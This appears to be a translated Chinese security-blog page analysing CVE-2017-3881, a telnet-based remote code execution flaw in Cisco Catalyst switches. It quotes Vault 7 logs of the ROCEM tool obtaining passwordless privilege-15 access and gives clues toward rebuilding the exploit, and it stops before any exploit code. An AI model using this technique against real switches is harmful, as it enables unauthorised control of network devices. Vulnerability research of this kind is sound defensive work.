<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【漏洞分析】CVE-2017-3881：思科 Catalyst 交换机远程代码执行漏洞分析 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="CVE-2017-3881,思科漏洞,思科交换机远程代码执行漏洞"/>
    
        <meta name="description" content="你的Catalyst交换机是否启用了telnet？ 如果是的话，那就要小心了。本文主要为针对配备了最新固件的Catalyst 2960交换机的远程代码执行漏洞分析。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【漏洞分析】CVE-2017-3881：思科 Catalyst 交换机远程代码执行漏洞分析</h2>
                <div class="article-msg">
                    <span class="time">2017-04-11 19:13:58</span>
                    
                                        <span class="read">阅读：14041次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3719"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3719" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/"
                             target="_blank">来源： artkond.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2522399780" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2522399780" style="color:#848e99;">shan66</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p1.qhimg.com/t01c39509237f2f16ed.jpg" title="t01bb225ea2494cc283.jpg" alt="http://p1.qhimg.com/t01bb225ea2494cc283.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2522399780" target="_blank" textvalue="shan66"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192); font-weight: 900;">shan66</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">预估稿费：200RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">您的Catalyst交换机上是否启用了telnet？ 如果是的话，那就要小心了。本文将向读者介绍针对配备了最新固件的Catalyst 2960交换机的远程代码执行漏洞的概念验证攻击技术。具体的漏洞利用代码可以从<a href="https://github.com/artkond/cisco-rce/" target="_self" style="color: rgb(255, 0, 0); text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">这里</span></a>下载。以下是对2017年3月7日中情局泄露的机密文件中的一个安全漏洞的利用开发流程的详细说明，此外，思科公司于2017年3月17日也公开披露了该漏洞的详细情况。但是，截止撰写本文时，仍然没有可用的补丁。尽管如此，还是有一个补救措施的，那就是禁用telnet，并代之以使用SSH。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CIA泄漏的Vault 7&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2017年3月7日，中央情报局的一系列文件被泄露，并被公布到维基解密上。其中，一份文件中涉及了一个影响多款Cisco交换机的远程代码执行漏洞。这个漏洞在泄露的文档中的代号为ROCEM。虽然提到的技术细节很少，但仍然引起了人们的注意。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Vault 7的文档暴露了实际的漏洞利用代码的测试过程，但是没有泄露漏洞利用的源代码。根据泄露的内容来看，有两点格外引入注目：该工具可以以交互模式或设置模式启动。其中，交互模式通过telnet发送有效载荷，并能够在同一telnet连接的上下文中立即向攻击者提供命令shell。下面的内容引自该<a href="https://wikileaks.org/ciav7p1/cms/page_23134373.html" target="_self" style="color: rgb(255, 0, 0); text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">文档</span></a>：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">Started&nbsp;ROCEM&nbsp;interactive&nbsp;session&nbsp;-&nbsp;successful:&nbsp;
root@debian:/home/user1/ops/adverse/adverse-1r/rocem#&nbsp;./rocem_c3560-ipbase-mz.122-35.SE5.py&nbsp;-i&nbsp;192.168.0.254
[+]&nbsp;Validating&nbsp;data/interactive.bin
[+]&nbsp;Validating&nbsp;data/set.bin
[+]&nbsp;Validating&nbsp;data/transfer.bin
[+]&nbsp;Validating&nbsp;data/unset.bin
****************************************
Image:&nbsp;c3560-ipbase-mz.122-35.SE5
Host:&nbsp;192.168.0.254
Action:&nbsp;Interactive
****************************************
Proceed?&nbsp;(y/n)y
Trying&nbsp;127.0.0.1...
[*]&nbsp;Attempting&nbsp;connection&nbsp;to&nbsp;host&nbsp;192.168.0.254:23
Connected&nbsp;to&nbsp;127.0.0.1.
Escape&nbsp;character&nbsp;is&nbsp;&#39;^]&#39;.
[+]&nbsp;Connection&nbsp;established
[*]&nbsp;Starting&nbsp;interactive&nbsp;session
User&nbsp;Access&nbsp;Verification
Password:
MLS-Sth#
MLS-Sth#&nbsp;show&nbsp;priv
Current&nbsp;privilege&nbsp;level&nbsp;is&nbsp;15
MLS-Sth#show&nbsp;users
Line&nbsp;User&nbsp;Host(s)&nbsp;Idle&nbsp;Location
*&nbsp;1&nbsp;vty&nbsp;0&nbsp;idle&nbsp;00:00:00&nbsp;192.168.221.40
Interface&nbsp;User&nbsp;Mode&nbsp;Idle&nbsp;Peer&nbsp;Address
MLS-Sth#exit
Connection&nbsp;closed&nbsp;by&nbsp;foreign&nbsp;host.</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">设置模式。修改交换机内存，以便将来可以在无需密码的情况下建立telnet连接。下面的内容引自该<a href="https://wikileaks.org/ciav7p1/cms/page_17760327.html" target="_self">文档</a>：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">Test&nbsp;set/unset&nbsp;feature&nbsp;of&nbsp;ROCEM
DUT&nbsp;configured&nbsp;with&nbsp;target&nbsp;configuration&nbsp;and&nbsp;network&nbsp;setup
DUT&nbsp;is&nbsp;accessed&nbsp;by&nbsp;hopping&nbsp;through&nbsp;three&nbsp;flux&nbsp;nodes&nbsp;as&nbsp;per&nbsp;the&nbsp;CONOP
Reloaded&nbsp;DUT&nbsp;to&nbsp;start&nbsp;with&nbsp;a&nbsp;clean&nbsp;device
From&nbsp;Adverse&nbsp;ICON&nbsp;machine,&nbsp;set&nbsp;ROCEM:
root@debian:/home/user1/ops/adverse/adverse-1r/rocem#&nbsp;./rocem_c3560-ipbase-mz.122-35.SE5.py&nbsp;-s&nbsp;192.168.0.254
[+]&nbsp;Validating&nbsp;data/interactive.bin
[+]&nbsp;Validating&nbsp;data/set.bin
[+]&nbsp;Validating&nbsp;data/transfer.bin
[+]&nbsp;Validating&nbsp;data/unset.bin
****************************************
Image:&nbsp;c3560-ipbase-mz.122-35.SE5
Host:&nbsp;192.168.0.254
Action:&nbsp;Set
****************************************
Proceed?&nbsp;(y/n)y
[*]&nbsp;Attempting&nbsp;connection&nbsp;to&nbsp;host&nbsp;192.168.0.254:23
[+]&nbsp;Connection&nbsp;established
[*]&nbsp;Sending&nbsp;Protocol&nbsp;Step&nbsp;1
[*]&nbsp;Sending&nbsp;Protocol&nbsp;Step&nbsp;2
[+]&nbsp;Done
root@debian:/home/user1/ops/adverse/adverse-1r/rocem#
Verified&nbsp;I&nbsp;could&nbsp;telnet&nbsp;and&nbsp;rx&nbsp;priv&nbsp;15&nbsp;without&nbsp;creds:
root@debian:/home/user1/ops/adverse/adverse-1r/rocem#&nbsp;telnet&nbsp;192.168.0.254
Trying&nbsp;192.168.0.254...
Connected&nbsp;to&nbsp;192.168.0.254.
Escape&nbsp;character&nbsp;is&nbsp;&#39;^]&#39;.
MLS-Sth#
MLS-Sth#show&nbsp;priv
Current&nbsp;privilege&nbsp;level&nbsp;is&nbsp;15
MLS-Sth#</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在研究此漏洞时，我们发现了一段非常有用的信息，即telnet的调试输出。下面是引自该文档的内容：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">14.&nbsp;Confirm&nbsp;Xetron&nbsp;EAR&nbsp;5355&nbsp;-&nbsp;Debug&nbsp;telnet&nbsp;causes&nbsp;anomalous&nbsp;output&nbsp;
&nbsp;&nbsp;1.Enabled&nbsp;debug&nbsp;telnet&nbsp;on&nbsp;DUT
&nbsp;&nbsp;2.Set&nbsp;ROCEM
&nbsp;&nbsp;3.Observed&nbsp;the&nbsp;following:
&nbsp;&nbsp;&nbsp;&nbsp;000467:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;received&nbsp;WILL&nbsp;TTY-SPEED&nbsp;(32)&nbsp;(refused)
&nbsp;&nbsp;&nbsp;&nbsp;000468:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;sent&nbsp;DONT&nbsp;TTY-SPEED&nbsp;(32)
&nbsp;&nbsp;&nbsp;&nbsp;000469:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;received&nbsp;WILL&nbsp;LOCAL-FLOW&nbsp;(33)&nbsp;(refused)
&nbsp;&nbsp;&nbsp;&nbsp;000470:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;sent&nbsp;DONT&nbsp;LOCAL-FLOW&nbsp;(33)
&nbsp;&nbsp;&nbsp;&nbsp;000471:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;received&nbsp;WILL&nbsp;LINEMODE&nbsp;(34)
&nbsp;&nbsp;&nbsp;&nbsp;000472:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;sent&nbsp;DONT&nbsp;LINEMODE&nbsp;(34)&nbsp;(unimplemented)
&nbsp;&nbsp;&nbsp;&nbsp;000473:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;received&nbsp;WILL&nbsp;NEW-ENVIRON&nbsp;(39)
&nbsp;&nbsp;&nbsp;&nbsp;000474:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;sent&nbsp;DONT&nbsp;NEW-ENVIRON&nbsp;(39)&nbsp;(unimplemented)
&nbsp;&nbsp;&nbsp;&nbsp;000475:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;received&nbsp;DO&nbsp;STATUS&nbsp;(5)
&nbsp;&nbsp;&nbsp;&nbsp;000476:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;sent&nbsp;WONT&nbsp;STATUS&nbsp;(5)&nbsp;(unimplemented)
&nbsp;&nbsp;&nbsp;&nbsp;000477:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;received&nbsp;WILL&nbsp;X-DISPLAY&nbsp;(35)&nbsp;(refused)
&nbsp;&nbsp;&nbsp;&nbsp;000478:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;sent&nbsp;DONT&nbsp;X-DISPLAY&nbsp;(35)
&nbsp;&nbsp;&nbsp;&nbsp;000479:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;TCP2:&nbsp;Telnet&nbsp;received&nbsp;DO&nbsp;ECHO&nbsp;(1)
&nbsp;&nbsp;&nbsp;&nbsp;000480:&nbsp;Jun&nbsp;3&nbsp;13:54:09.330:&nbsp;Telnet2:&nbsp;recv&nbsp;SB&nbsp;NAWS&nbsp;116&nbsp;29
&nbsp;&nbsp;&nbsp;&nbsp;000481:&nbsp;Jun&nbsp;3&nbsp;13:54:09.623:&nbsp;Telnet2:&nbsp;recv&nbsp;SB&nbsp;36&nbsp;92&nbsp;OS^K&#39;zAuk,Fz90X
&nbsp;&nbsp;&nbsp;&nbsp;000482:&nbsp;Jun&nbsp;3&nbsp;13:54:09.623:&nbsp;Telnet2:&nbsp;recv&nbsp;SB&nbsp;36&nbsp;0&nbsp;^CCISCO_KITS^Ap</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">请注意该服务在最后一行接收到的CISCO_KITS选项，这是一个非常重要的字符串。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">思科的漏洞报告</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">思科公司于2017年3月17日<a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp" target="_self">公布</a>了其交换机中存在的这个漏洞。这份报告是基于Vault 7中的文档：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Cisco IOS和Cisco IOS XE软件中的思科集群管理协议（CMP）处理代码中的漏洞可能允许未经身份验证的远程攻击者重新加载受影响的设备，或者远程执行具有更高权限的代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在撰写本文时，除了下段文字之外，仍然没有更多的细节可用：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">集群管理协议在内部使用Telnet作为集群成员之间的信令和命令协议。这个漏洞是由于两个因素共同导致的：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">没有将与CMP有关的Telnet选项限制在集群成员之间的内部本地通信中，而是接受和处理通过任何与受影响设备的Telnet连接发送的此类选项，与此同时，也没有正确处理畸形的与CMP有关的Telnet选项。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">长话短说，该漏洞允许攻击者利用telnet服务在目标交换机上远程执行代码。但为了应用这个报告，我需要更多的信息。所以我决定深入研究一下思科集群管理协议。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">交换机群集</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">好吧！我搞了两个Catalyst 2960交换机来研究这个漏洞。集群技术会将交换机设置为主从关系。主交换机能够在从交换机上获得特权命令shell。正如Cisco在其报告中所提到的那样，telnet被用作集群成员之间的命令协议。有关群集的信息可以在这里找到，这里是一个设置群集环境的例子。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，我们来考察一下集群成员之间的通信。以下是主交换机的配置：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">cluster&nbsp;enable&nbsp;CLGRP&nbsp;0
cluster&nbsp;member&nbsp;1&nbsp;mac-address&nbsp;xxxx.xxxx.xxxx</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这会把附近的交换机添加为集群的从交换机。rcommand &lt;num&gt;允许从主交换机的接口上获得从设备的命令接口。这符合设计预期。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">catalyst1&gt;rcommand&nbsp;1
catalyst2&gt;who
&nbsp;&nbsp;&nbsp;&nbsp;Line&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Host(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Idle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Location
*&nbsp;&nbsp;1&nbsp;vty&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;idle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00:00:00&nbsp;10.10.10.10
&nbsp;&nbsp;Interface&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Idle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Peer&nbsp;Address</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们来看看rcommand生成的流量：</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t017f8fb26e64fe1b02.png" title="t01b6f5e2062adac053.png" alt="http://p2.qhimg.com/t01b6f5e2062adac053.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">嘿! telnet流量能干啥？ 报告明确指出：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">集群管理协议在内部使用Telnet作为集群成员之间的信令和命令协议。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">不错，实际上运行show version可以看到更多的流量：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">catalyst2&gt;show&nbsp;version
